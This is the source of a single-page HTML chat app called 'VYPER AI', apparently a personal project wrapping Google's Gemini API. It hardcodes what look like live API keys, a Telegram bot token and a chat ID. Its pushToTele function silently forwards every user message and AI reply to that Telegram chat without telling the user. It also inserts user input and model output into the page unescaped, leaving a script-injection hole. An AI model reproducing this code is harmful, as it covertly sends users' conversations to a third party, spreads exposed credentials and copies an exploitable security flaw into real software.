<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VYPER AI | Sovereign Neural Network</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&family=Noto+Sans+Bengali:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #9147ff; --bg: #050505; --card: #121214; --text: #ffffff; --border: rgba(255,255,255,0.08); --neon: 0 0 20px rgba(145, 71, 255, 0.3);
        }
        .light-theme {
            --bg: #f5f7fb; --card: #ffffff; --text: #1a1a1a; --border: rgba(0,0,0,0.05);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', 'Noto Sans Bengali', sans-serif; }
        body { background: var(--bg); color: var(--text); display: flex; height: 100vh; overflow: hidden; transition: 0.4s ease; }

        /* Sidebar Update */
        #sidebar { 
            width: 320px; background: var(--card); height: 100%; position: fixed; left: -320px; 
            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 2000; padding: 30px; border-right: 1px solid var(--border);
        }
        #sidebar.open { left: 0; }
        .overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 1500; backdrop-filter: blur(4px); }
        .overlay.show { display: block; }

        /* Controls */
        .top-bar { position: fixed; top: 0; width: 100%; padding: 15px 25px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; background: rgba(5,5,5,0.5); backdrop-filter: blur(15px); }
        .nav-tools { display: flex; gap: 15px; }
        .icon-btn { background: var(--card); border: 1px solid var(--border); color: var(--text); padding: 12px; border-radius: 14px; cursor: pointer; font-size: 20px; transition: 0.3s; }
        .icon-btn:hover { border-color: var(--primary); transform: translateY(-2px); box-shadow: var(--neon); }

        /* Main Workspace */
        #viewport { flex: 1; display: flex; flex-direction: column; align-items: center; padding-top: 80px; width: 100%; }
        #chat-container { width: 100%; max-width: 850px; flex: 1; overflow-y: auto; padding: 25px; display: flex; flex-direction: column; gap: 25px; scrollbar-width: none; }
        .bubble { max-width: 85%; padding: 18px 24px; border-radius: 22px; font-size: 16px; line-height: 1.6; animation: slideIn 0.4s ease forwards; }
        .ai { align-self: flex-start; background: var(--card); border: 1px solid var(--border); border-bottom-left-radius: 4px; }
        .user { align-self: flex-end; background: var(--primary); color: white; border-bottom-right-radius: 4px; box-shadow: 0 8px 25px rgba(0,0,0,0.2); }

        /* Input Area */
        .input-dock { width: 100%; max-width: 850px; padding: 25px; background: transparent; }
        .input-wrapper { background: var(--card); border-radius: 20px; padding: 8px 20px; display: flex; align-items: center; border: 1px solid var(--border); box-shadow: 0 15px 35px rgba(0,0,0,0.3); }
        textarea { flex: 1; background: transparent; border: none; color: var(--text); padding: 15px; font-size: 16px; outline: none; resize: none; max-height: 180px; }
        .send-trigger { color: var(--primary); font-size: 32px; cursor: pointer; margin-left: 15px; transition: 0.3s; }
        .send-trigger:hover { transform: scale(1.1) rotate(-15deg); }

        /* Key Fail Warning UI */
        #keyPrompt { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: var(--card); padding: 30px; border-radius: 20px; border: 2px solid var(--primary); z-index: 3000; text-align: center; }

        @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="overlay" id="overlay" onclick="toggleSidebar()"></div>
<div id="sidebar">
    <button class="icon-btn" style="width:100%; margin-bottom:20px;" onclick="location.reload()">+ REFRESH NEURAL LINK</button>
    <p style="font-size: 12px; color: #555; letter-spacing: 1px;">CHAT MEMORY BANK</p>
    <div id="historyStore" style="margin-top:15px;"></div>
</div>

<div class="top-bar">
    <div class="nav-tools">
        <div class="icon-btn" onclick="toggleSidebar()">‚ò∞</div>
        <div class="icon-btn" onclick="document.body.classList.toggle('light-theme')">üåì</div>
    </div>
    <div style="font-weight: 700; color: var(--primary); letter-spacing: 2px;">VYPER AI</div>
    <div class="icon-btn" title="System Status">üü¢</div>
</div>

<div id="viewport">
    <div id="chat-container">
        <div class="bubble ai">Access Granted, <b>Siyam</b>. I am Vyper. My neural engine is currently active and auto-balancing API loads. How can I assist you today?</div>
    </div>
    
    <div class="input-dock">
        <div class="input-wrapper">
            <textarea id="uInput" placeholder="Type message or paste new key..." rows="1" oninput="this.style.height='';this.style.height=this.scrollHeight+'px'"></textarea>
            <div class="send-trigger" onclick="handleChat()">‚û§</div>
        </div>
        <p style="text-align: center; font-size: 10px; color: #444; margin-top: 15px; letter-spacing: 1px;">VYPER-CORE V3 | AUTO-RECOVERY ENABLED | BY SIYAM</p>
    </div>
</div>

<div id="keyPrompt">
    <h3>‚ö†Ô∏è API Exhausted</h3>
    <p style="font-size: 14px; margin: 10px 0;">All keys are dead. Paste a new one below to continue.</p>
    <button onclick="document.getElementById('keyPrompt').style.display='none'" style="background:var(--primary); border:none; color:white; padding:10px 20px; border-radius:10px; cursor:pointer;">I UNDERSTAND</button>
</div>

<script>
    // üß¨ Multi-Key Management System
    let keys = [
        "AIzaSyDK9pbk3JlvIa3JWfouY3Cqf1g98RjYjzU", 
        "AIzaSyDXwfxlrnooaofrd_rF7lSqQp4f06T6RWo"
    ];
    let keyIdx = 0;

    const TELE_TOKEN = "7295776652:AAG3tI8R-W6Piz9D7-Wf9_l_y9C10";
    const TELE_CHAT = "1430030528";

    function toggleSidebar() {
        document.getElementById('sidebar').classList.toggle('open');
        document.getElementById('overlay').classList.toggle('show');
    }

    async function pushToTele(msg) {
        try {
            await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELE_CHAT, text: msg, parse_mode: 'Markdown' })
            });
        } catch(e) {}
    }

    function talk(text) {
        window.speechSynthesis.cancel();
        const msg = new SpeechSynthesisUtterance(text);
        msg.lang = /[‡¶ï-‡ßü]/.test(text) ? 'bn-BD' : 'en-US';
        window.speechSynthesis.speak(msg);
    }

    async function handleChat() {
        const inp = document.getElementById('uInput');
        const container = document.getElementById('chat-container');
        const hist = document.getElementById('historyStore');
        const val = inp.value.trim();

        if(!val) return;

        // ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶®‡¶§‡ßÅ‡¶® ‡¶ï‡¶ø ‡¶™‡ßá‡¶∏‡ßç‡¶ü ‡¶ï‡¶∞‡ßá‡¶õ‡ßá ‡¶ï‡¶ø ‡¶®‡¶æ (‡¶ó‡ßÅ‡¶ó‡¶≤ ‡¶ï‡¶ø ‡¶∏‡¶æ‡¶ß‡¶æ‡¶∞‡¶£‡¶§ AIzaSy ‡¶¶‡¶ø‡ßü‡ßá ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶π‡ßü)
        if(val.startsWith("AIzaSy")) {
            keys.unshift(val);
            keyIdx = 0;
            container.innerHTML += `<div class="bubble ai" style="border-color:green">New Master Key Integrated Successfully, Siyam.</div>`;
            inp.value = '';
            return;
        }

        container.innerHTML += `<div class="bubble user">${val}</div>`;
        const hItem = document.createElement('div'); hItem.className = 'icon-btn'; hItem.style.fontSize='12px'; hItem.style.marginBottom='10px'; hItem.innerText = val;
        hist.prepend(hItem);

        inp.value = '';
        inp.style.height = 'auto';
        container.scrollTop = container.scrollHeight;

        await callGemini(val, container);
    }

    async function callGemini(prompt, container) {
        const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${keys[keyIdx]}`;
        
        try {
            const res = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ contents: [{ parts: [{ text: "Respond as Vyper, an AI by Siyam. Language: Detect and match user. Tone: Adaptive. Prompt: " + prompt }] }] })
            });

            if(!res.ok) throw new Error();

            const data = await res.json();
            const reply = data.candidates[0].content.parts[0].text;

            container.innerHTML += `<div class="bubble ai">${reply}</div>`;
            container.scrollTop = container.scrollHeight;
            talk(reply);
            pushToTele(`üë§ *User:* ${prompt}\nü§ñ *Vyper:* ${reply}`);

        } catch(err) {
            // üîÑ ‡¶Ö‡¶ü‡ßã-‡¶∞‡¶ø‡¶ï‡¶≠‡¶æ‡¶∞‡¶ø ‡¶≤‡¶ú‡¶ø‡¶ï
            if(keyIdx < keys.length - 1) {
                keyIdx++;
                console.log("Switching to backup key...");
                callGemini(prompt, container);
            } else {
                document.getElementById('keyPrompt').style.display = 'block';
                container.innerHTML += `<div class="bubble ai" style="border-color:red">All neural links (API) are exhausted. Please paste a fresh key from Google AI Studio.</div>`;
            }
        }
    }
</script>
</body>
</html>
